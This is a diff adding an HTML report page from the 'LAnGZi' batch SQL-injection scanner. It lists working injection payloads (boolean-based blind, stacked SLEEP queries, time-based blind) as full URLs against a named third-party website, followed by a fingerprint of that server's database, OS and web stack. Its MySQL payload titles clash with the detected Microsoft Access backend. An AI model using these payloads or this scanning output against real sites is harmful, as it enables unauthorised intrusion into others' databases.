@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>LAnGZi SQL Injection Report Version 3.8</title>
+    <link rel="stylesheet" href='https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap-theme.min.css'>
+    <link rel="stylesheet" href='https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css'>
+</head>
+<div class="container">
+    <div class="navbar navbar-default">
+        <div class="navbar-header">
+            <a class="navbar-brand" href="#">LAnGZi</a>
+        </div>
+        <ul class="nav navbar-nav">
+            <li><a href="http://www.langzi.fun/Python%20%E6%89%B9%E9%87%8FSQL%E6%B3%A8%E5%85%A5%E6%89%AB%E6%8F%8F.html">项目地址</a>
+            </li>
+            <li>
+                <a href="http://www.langzi.fun/%E4%B8%80%E9%94%AE%E8%87%AA%E5%8A%A8%E5%8C%96%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF.html">可拓展信息处理</a>
+            </li>
+            <li>
+                <a href="http://www.langzi.fun/Python%20%E6%89%AB%E6%8F%8FIP%E4%BB%A3%E7%90%86%E6%B1%A0.html">可拓展IP代理池</a>
+            </li>
+        </ul>
+
+    </div>
+</div>
+
+
+<div class="col-md-12 font-weight-bold"><br>
+
+
+    <div class="panel panel-primary">
+        <div class="panel-heading">
+            网站漏洞报表
+        </div>
+        <div class="panel-body">
+            <table class="table">
+
+<tr><td>注入参数(方式)</td><td> #1* (URI)
+    </td></tr><tr class="active"><td>注入方式</td><td>boolean-based blind
+    </td></tr><tr><td>注入标题</td><td>AND boolean-based blind - WHERE or HAVING clause
+    </td></tr><tr><td>注入攻击</td><td>http://fengchedm.com:80/content/26355' AND 8320=8320 AND 'HbeE'='HbeE.html
+
+    </td></tr><tr class="active"><td>注入方式</td><td>stacked queries
+    </td></tr><tr><td>注入标题</td><td>MySQL > 5.0.11 stacked queries (comment)
+    </td></tr><tr><td>注入攻击</td><td>http://fengchedm.com:80/content/26355';SELECT SLEEP(5)#.html
+
+    </td></tr><tr class="active"><td>注入方式</td><td>AND/OR time-based blind
+    </td></tr><tr><td>注入标题</td><td>MySQL >= 5.0.12 OR time-based blind
+    </td></tr><tr><td>注入攻击</td><td>http://fengchedm.com:80/content/26355' OR SLEEP(5) AND 'OGMN'='OGMN.html
+
+</td></tr>
+
+
+                <tr><td>数据库类型</td><td> Microsoft Access
+</td></tr><tr><td>服务器版本</td><td>Windows 2008 R2 or 7
+</td></tr><tr><td>服务器语言</td><td>ASP.NET, Microsoft IIS 7.5, ASP
+</td></tr><tr><td>数据库版本</td><td>Microsoft Access
+</td></tr>
